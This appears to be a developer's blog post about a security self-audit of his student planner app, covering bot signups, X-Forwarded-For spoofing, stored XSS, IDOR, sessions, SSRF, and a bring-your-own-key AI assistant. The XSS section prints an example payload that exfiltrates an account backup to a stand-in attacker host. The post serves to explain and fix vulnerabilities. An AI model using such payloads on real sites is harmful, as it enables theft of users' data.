---
title: "176 bots signed up in two weeks. That turned out to be the least of my problems"
published: false
tags: security, python, webdev, showdev
canonical_url:
cover_image: https://getdoday.ru/habr-img/cover-ui-1560x880.png
---

# 176 bots signed up in two weeks. That turned out to be the least of my problems

Four months ago I sat down to write an ordinary todo app. Today `getdoday.ru` is a planner for students, and next to it live a few more products: a school Q&A site, a traffic-rules trainer, a booking cabinet for tutors. One monolith, 86,000 lines, 1,325 tests, deployed with a single command.

Then I opened the database and saw 238 new accounts. 62 had confirmed their email.

The other 176 were bots.

I went in to find out how they walked past three layers of protection. That took an hour. Then I spent twelve more hours unable to stop — because the bots turned out to be the most harmless thing I found that day.

> In this post: what the attack looked like, what I found when I opened my own code end to end, how an AI assistant that costs me nothing works, and what one day of careful reading actually bought me.

---

## Part 1. The bots

Their domains were telling: `yahoo`, `hotmail`, `aol`, corporate mailboxes from old breaches. And among them — `sdffsd.sdd`, `flsdfmsodf.ro`, `prweorwef.com`.

To be clear: this was not an attack on me. Nobody was picking locks on my site. It's ordinary untargeted form spam — someone runs a list of sites and posts into anything that looks like a signup form.

That's exactly why it's worth writing about. Everyone who ships a public form meets this.

I did have protection. Three layers:

1. **A honeypot field** — invisible to humans, filled in by bots.
2. **Rate limiting** — five signups per minute per IP.
3. **Email confirmation** — a link in a letter.

None of them worked. For three different reasons.

### The limit that wiped itself

Five per minute is 7,200 a day. Already a joke.

But the number wasn't the problem. Here's where the counter lived:

```python
_ATTEMPTS: dict[str, deque[float]] = {}


def hit(key: str, *, max_calls: int, per_seconds: float) -> bool:
    now = monotonic()
    bucket = _ATTEMPTS.setdefault(key, deque())
    cutoff = now - per_seconds
    while bucket and bucket[0] < cutoff:
        bucket.popleft()
    if len(bucket) >= max_calls:
        return False
    bucket.append(now)
    return True
```

In process memory. And my deploy restarts the service — on a good day I ship forty times.

The counter was wiped several times an hour.

> It protected nothing. It merely existed — like a "beware of dog" sign on a gate with no dog.

There's a second subtlety I found later: uvicorn runs two workers, each with its own dictionary. So the effective limit was ten, not five, and which worker you land on is luck.

**Takeaway:** an in-memory counter guards against accidental double-clicks, not against a bot. State that must survive a restart belongs in the database.

### The IP you can forge with one header

This is the ugly one, and I found it by accident — I just wanted to check whether the limit worked at all.

The service runs behind nginx. To see the real client address rather than the proxy's, uvicorn starts with:

```
--proxy-headers --forwarded-allow-ips='*'
```

Looks harmless. "Trust headers from the proxy." Right?

Here's uvicorn's own source:

```python
def get_trusted_client_host(self, x_forwarded_for: str) -> str:
    x_forwarded_for_hosts = _parse_raw_hosts(x_forwarded_for)
    if self.always_trust:
        return x_forwarded_for_hosts[0]   # the LEFTMOST element
```

With `--forwarded-allow-ips='*'`, `always_trust` kicks in and takes the **leftmost** element of `X-Forwarded-For`.

Now, how does nginx build that header?

```nginx
proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
```

`$proxy_add_x_forwarded_for` is "whatever the client sent" **plus the real address appended on the right**. Client sends `X-Forwarded-For: 1.2.3.4`, the app receives `1.2.3.4, 93.x.x.x` — and takes the first one. The one written by the client.

I didn't believe it, so I tested against my own production. Forty requests to the login endpoint, a non-existent account, nothing created:

| What I did | What I got |
|---|---|
| Fixed spoofed `X-Forwarded-For: 203.0.113.7` | **429: 20**, 401: 20 — the limit fired, on the spoofed address |
| Immediately after, rotating the header every request | **429: 0**, 401: 40 — the limit never fired |

Look at the second row. If the header were ignored, the second run would have inherited the already-full bucket of my real address and returned 429 on the first request. It returned zero. Forty times in a row.

So **every IP-based limit I had was one header line away from useless**: signup, login, anonymous page flood protection.

Two fixes. The correct flag on the server:

```
--forwarded-allow-ips=127.0.0.1
```

And in the app, I stopped depending on how uvicorn was launched:

```python
def client_ip(request: Request) -> str | None:
    """The real client address, which cannot be forged with a header.

    nginx appends the real address on the RIGHT ($proxy_add_x_forwarded_for),
    so we take the last element — written by our proxy, not by a guest.
    """
    forwarded = request.headers.get("x-forwarded-for")
    if forwarded:
        parts = [p.strip() for p in forwarded.split(",") if p.strip()]
        if parts:
            return parts[-1]
    return request.client.host if request.client else None
```

Honest caveat: "take the rightmost" is correct for exactly one proxy. Behind a chain (CDN → nginx) the rightmost is the first proxy's address — not the real client, but also not forgeable.

**Takeaway:** if your app makes decisions based on IP, it must know which source of that IP it trusts. `'*'` doesn't mean "trust the proxy". It means "trust anyone".

### Email confirmation that confirmed nothing

There was an `email_verified_at` column. The letter went out, the link worked, the timestamp was written.

Then I grepped for places where that column gates anything. There were none. The auth service even had an honest comment I'd written myself:

```python
# Email verification is "soft": unverified users may sign in.
```

A bot registered and used the account immediately.

I chose **not** to make the check hard, and some will disagree. Letters get lost, land in spam, arrive at a mailbox a teenager can't open on their phone. A hard gate would cut off real people to stop bots that can be stopped more cheaply.

Instead: accounts with no confirmed email, no tasks, no Telegram link and no tutor profile are deleted automatically after 30 days.

### What I put in place

Three measures, none of which needs a CAPTCHA — a CAPTCHA hurts humans more than bots.

**1. A signed form timestamp.** The form carries the time it was rendered, signed with the app secret:

```python
def issue_form_token() -> str:
    ts = f"{datetime.now(UTC).timestamp():.0f}"
    return f"{ts}.{_sign(ts)}"


def _sign(ts: str) -> str:
    secret = get_settings().app_secret_key.encode()
    return hmac.new(secret, f"register:{ts}".encode(), hashlib.sha256).hexdigest()[:32]
```

Submitted instantly, without a timestamp, or with a forged one → rejected. That kills the whole "POST directly against a list of URLs" class.

**2. Counting signups in the database.** Two new columns: `signup_ip` and `signup_subnet` (first three octets — changing the last one costs nothing).

```python
MAX_PER_IP_HOUR = 5
MAX_PER_SUBNET_HOUR = 30
```

The allowance is deliberately generous. My users sit behind school NAT and mobile CGNAT, where a hundred people look like one address. Cloudflare has measured that CGNAT addresses get rate-limited three times more often while containing *fewer* bots. A CS lesson where a class signs up at once must not hit my wall.

**3. Checking that the email domain exists.** Here's the surprise. I was about to wire up disposable-email lists — and found they were useless against my bots: not one domain was a temp-mail service. But `sdffsd.sdd` and friends are NXDOMAIN. No MX, no A record. Mail physically cannot be delivered.

One DNS check removes them all — and it fails open, because a resolver timeout must never block a real person.

What I deliberately did **not** do: reject addresses with "many digits in a row". Plenty of my real users have a phone number as their mailbox name. A rule that catches bots together with humans is worse than no rule.

Plus an alarm: more than twenty signups in an hour and I get an email.

> I noticed those 176 bots after the fact, digging through the database by hand. That stings more than the rest.

---

## Part 2. What the audit actually turned up

Since the code was already open, I went through the whole project: auth, access control, payments, secret storage, XSS, SSRF. Twelve findings. Here are the ones worth knowing.

### Stored XSS through JSON-LD

The prettiest one. Public Q&A pages carried structured data for search engines:

```python
"jsonld": json.dumps(jsonld, ensure_ascii=False),
```

```html
<script type="application/ld+json">{{ jsonld | safe }}</script>
```

Safe, right? `json.dumps` escapes quotes and backslashes, so you can't break out of a string.

Except the HTML parser knows nothing about JSON. It closes `<script>` at the first `</script` sequence, wherever it sits. And that JSON carries a question title written by any registered user:

```
How do I solve</script><script>fetch('/api/backup/export',{credentials:'include'})
  .then(r=>r.text()).then(t=>navigator.sendBeacon('https://attacker.tld/x',t))</script>this
```

The page is public. The script would run for every visitor, including logged-in ones — and `/api/backup/export` returns a full account dump.

The fix, now applied to every JSON that goes inside a `<script>`:

```python
_REPLACEMENTS = (
    ("<", "\\u003c"),
    (">", "\\u003e"),
    ("&", "\\u0026"),
    (" ", "\\u2028"),
    (" ", "\\u2029"),
)


def script_json(data: Any) -> str:
    out = json.dumps(data, ensure_ascii=False)
    for char, escaped in _REPLACEMENTS:
        out = out.replace(char, escaped)
    return out
```

For JSON, `<` is the same character. For the HTML parser, it's an ordinary letter. U+2028 and U+2029 are in there for a reason: valid in JSON, line-terminating for the JavaScript parser.

> "I escaped the JSON" and "this is safe inside `<script>`" are two different statements. There's an HTML parser between them, and it doesn't care about your JSON.

### IDOR: other people's tasks by project ID

```python
if project_id is not None:
    # Project-scoped view: show all members' tasks in that project.
    stmt = select(Task).where(Task.project_id == project_id)
else:
    stmt = select(Task).where(Task.user_id == user_id)
```

With `project_id` set, the owner filter drops — by design, because members see each other's tasks inside a project. Membership was supposed to be checked by the caller; the docstring said so.

The HTML view checked. The JSON endpoint `GET /api/tasks?project_id=<uuid>` did not.

The realistic scenario isn't "attacker guesses a UUID". It's a removed member: kicked out everywhere, every other route honestly returns 404 — and this one keeps serving data. Forever.

Three lines, in the right place — inside the service, not the caller:

```python
if project_id is not None:
    if not await is_member(session, project_id, user_id):
        raise ProjectNotFound(str(project_id))
    stmt = select(Task).where(Task.project_id == project_id)
```

> "The caller must check" is an agreement, not a defence. Agreements break silently and without stack traces.

### An anonymous visitor filling someone's calendar

The tutor cabinet has a public booking page — no auth, by design.

Free slots are computed by a function that accounts for working days, hours, buffers, vacation, lead time and existing bookings. Nice function.

But the server took the submitted time **as-is** and checked exactly one thing: is that moment already taken. Everything else was a UI-only filter.

An anonymous POST could book 3 a.m., a vacation day, or last week. Every confirmed booking becomes a busy interval — a tutor's calendar can be filled months ahead in a minute.

And the client's email field was a plain string rather than a validated address, with a letter sent to it. The booking form was a free mail relay from my SMTP identity to anywhere.

### A leak through the iCal feed

Tutors are invited to subscribe to their calendar in Google Calendar. Every event description contained the client's name, **email**, and a **management link** — a capability URL that cancels or reschedules that booking without any auth.

So a feed URL the tutor hands to a third-party service, travelling in a query string (and therefore into nginx logs and Referer headers), carried the personal data of every client plus capability tokens for their bookings.

### A session that couldn't be revoked

Sessions lived only in a signed cookie. No server state — elegant, fast, database-free. The price: **there's nothing to revoke**.

Changing the password rewrote the hash while a stolen cookie kept working for the full two weeks.

> Someone changes their password precisely because they're scared for the account. And nothing changes.

The fix is a session epoch — one integer on the user, written into the cookie at login, compared on every request:

```python
user = await session.get(User, uid)
if user is None:
    return None
# Cookies issued before this field exist without an epoch —
# treat them as zero so nobody gets logged out on deploy.
if int(request.session.get("epoch", 0)) != user.session_epoch:
    request.session.clear()
    return None
return user
```

Changing the password bumps the number and every other session stops matching — including the one the password is being changed because of.

### The rest, briefly

- **A school-diary access token stored in plaintext**, with a comment saying "should be encrypted before production" that I wrote myself. Now Fernet with a key derived from the app secret via PBKDF2.
- **Cookies leaking into a neighbouring project** — a proxy to a game on an adjacent port forwarded headers wholesale, session cookie included, and passed its `Set-Cookie` back.
- **A CSRF exemption wider than needed**, covering a whole path prefix when only one endpoint had its own auth.
- **The email-confirmation token written to the log** in full. Valid for three days. Whoever reads logs, confirms other people's emails.
- **No Content-Security-Policy from the app at all** — the only one lived in an nginx config, in a single `location` block.

Everything is fixed and covered by tests. But the list is sobering: I wrote this code over four months and was sure I understood how it worked.

---

## Part 3. An AI assistant that costs me nothing

Second big story of the summer: how to put AI into a free product without going broke.

The task sounded simple. A student looks at a task called "Physics, chapter 24" and taps a button to ask for an explanation. Not a ready answer — an explanation.

### Why not my key

The obvious approach: take a provider key, put it in the environment, serve answers to everyone. Three reasons I didn't.

**Money.** The audience is students, the product is free. Any spike in popularity turns into a bill I pay. One runaway loop in someone's script and the balance is gone overnight.

**Responsibility.** If the key is mine, I'm the one making the requests. Then the content of those conversations is on me too.

**Law.** A request to a foreign provider is a cross-border transfer of personal data. For a Russian service with an under-18 audience, that's a separate obligation with its own filing.

So: **everyone connects their own key.**

- users don't depend on my limits;
- I can't read their conversations — the keys are encrypted and the traffic is theirs;
- the bill goes to whoever spends it;
- my token cost stays at zero no matter how far this grows.

### How it works

The key is a user's secret sitting in my database, so encryption isn't optional:

```python
KEY_VERSION = 1
_SALT_V1 = b"doday-ai-provider-key-v1"


def _fernet_for_version(version: int) -> Fernet:
    if version != KEY_VERSION:
        raise AiKeyError(f"unknown key encryption version: {version}")
    secret = get_settings().app_secret_key.encode("utf-8")
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=_SALT_V1, iterations=100_000)
    return Fernet(base64.urlsafe_b64encode(kdf.derive(secret)))
```

Two decisions worth explaining. The encryption key is **derived deterministically** from the app secret — nothing extra to store, and it survives the restarts my deploy causes constantly. And the **schema version sits next to the ciphertext**, so changing salt or algorithm later is a new branch, not a data migration.

The key is never shown again — the UI displays the last four characters.

In the product itself:

- every task has an **"Ask AI" button** that opens the chat with the task already attached and the beginning of the question pre-filled;
- inside the chat you can **attach several tasks** and ask "what should I do first" — their titles, descriptions and deadlines go to the model with the question;
- **prompt templates** above the input: "explain simply", "check my solution", "where do I start";
- the answer **streams word by word**;
- the model can be changed right in the chat, without touching the key.

Streaming in FastAPI 0.115 has no dedicated primitive, so SSE is assembled by hand:

```python
return StreamingResponse(
    events(),
    media_type="text/event-stream",
    headers={
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        # Without this nginx buffers the response and streaming
        # turns into "nothing happens, then everything at once".
        "X-Accel-Buffering": "no",
    },
)
```

`POST`, because `EventSource` only speaks `GET`. The front end reads it with `fetch` + `ReadableStream`. `proxy_buffering off` and `gzip off` are duplicated in the nginx location — compression buffers too.

### Three traps

**Trap one: answers vanished.** A user wrote: "I asked something, the AI stopped mid-sentence, and when I came back the history was empty."

The saving code looked bulletproof:

```python
finally:
    answer = "".join(collected).strip()
    if answer:
        await save_message(session, user.id, role="assistant", content=answer)
```

Whatever happens, `finally` saves it. Right?

`finally` in an async generator runs at a very inconvenient moment. When the client disconnects, the generator is closed and `GeneratorExit` is thrown in at the `yield`. Inside `finally` we then `await` a database session that's already closing with the dropped connection. And a `yield` after `GeneratorExit` is a `RuntimeError: async generator ignored GeneratorExit`.

The fix is to stop being heroic at the end and **save as you go**:

```python
saved_id: UUID | None = None
saved_len = 0
async for chunk in stream_completion(...):
    collected.append(chunk)
    yield f"data: {chunk}\n\n"
    text = "".join(collected)
    if len(text) - saved_len >= _SAVE_EVERY_CHARS:   # every 100 characters
        saved_id = await save_answer_progress(
            session, user.id, task_id=task_id, message_id=saved_id, content=text
        )
        saved_len = len(text)
```

> `finally` in an async generator is not a place for external resources. Persist state as it appears, not "at the end".

**Trap two: an error from one provider arriving from another.** Real support conversation: "it says the key isn't accepted", and the provider's own response reads `invalid api key secret: illegal base64 data at input byte 0`. I went to check who emits that phrase — and it wasn't the provider the user thought he'd picked. The dropdown defaulted to provider A while the instructions above it rendered for provider B, so it looked pre-selected.

Now the instruction header names the provider, and the field below says whose key is expected.

**Trap three, the instructive one.** I probed a dozen providers with a deliberately invalid key, got sensible auth errors, and concluded they all worked.

Then a user connected a real Google key and got:

```json
{"error": {"code": 400, "message": "User location is not supported for the API use.",
           "status": "FAILED_PRECONDITION"}}
```

The request originates from my server, which is in Russia. With an invalid key, Google answers about the key before it ever reaches the location check.

> My check produced a false positive, and the person who paid for it was the user who followed the whole setup guide to the end.

Geo-blocking now has its own message, separate from "bad key". And the provider's raw response (key stripped, markup removed, capped at 300 characters) is attached to our friendly message — without it, a user can't tell whether to fix the key, the model or the billing plan.

### And an SSRF I built myself

The provider list has a "bring your own OpenAI-compatible endpoint" option. The only validation was `startswith("https://")`.

So a user could point it at an internal address and my server would dutifully go there — and different error messages per status code turned it into an internal network scanner. Now the hostname is resolved and non-global addresses are rejected.

---

## Part 4. 334 articles built like code

Third story: growth. A product for students can't be promoted with paid ads — the audience has no money and conversion to payment is low by definition. That leaves search.

Articles are **markdown files in the repository**, not rows in a database behind an admin panel. That gives three things at once:

- edits go through version history, like code;
- texts are covered by automated tests: length, structure, broken links, presence of an FAQ block;
- publishing is the same command as deploying the site.

There's also a check for forbidden claims:

```python
_FORBIDDEN = (
    ("14 days pro", "there is no trial — we must not promise 14 days of Pro"),
    ("saml", "SAML SSO does not exist in the product"),
)
```

> Promising a feature that doesn't exist isn't marketing licence. It's the reason someone arrives, doesn't find it, and never comes back.

The first version parsed all markdown on request: with three hundred articles the index took **11.7 seconds**. A disk cache keyed by a fingerprint of the corpus (names, sizes, mtimes) plus a background warm-up at startup brought it to **0.67 seconds**. Seventeen times faster.

One note on the cache format: JSON, not pickle. Pickle is faster, but it's an executable format — a cache file someone can reach becomes arbitrary code execution.

---

## What it cost

The audit took one day. A full one, morning to night, with breaks for "no way, that can't be right".

| Metric | Value |
|---|---|
| Holes found and closed | 12 |
| New tests | ~60 |
| Database migrations | 9 |
| Commits shipped that day | 42 |

That's the number I'd underline. Not "how many holes" — "how much time".

One day of reading my own code carefully bought more than a month of new features. And I'm fairly sure that if you run your own product and have never given yourself such a day, roughly the same list is sitting in your repository right now.

---

## Three takeaways

**Protection you cannot verify is not protection.** My IP limit looked like it worked right up until I sent forty requests with a forged header. Every claim of the form "we have protection against X" deserves a manual test. Once. Today.

**A false positive is worse than no check.** The provider story is exactly that: the endpoint answered, the error looked sensible, the conclusion was wrong, and a user paid for it.

**Sometimes the law outranks the architecture.** I removed half the provider list not because those providers worked badly, but because moving data across a border is a separate responsibility. Engineering lost to legal, and that's fine.

---

Everything above is about products that already run. In parallel I'm building **Persona**, structured on entirely different principles — that's a separate post.

**Source code:** github.com/SwairIt/doday
The product itself: **getdoday.ru**. My other projects: **all.getdoday.ru**

Thanks for reading.

*Yaroslav Boev*
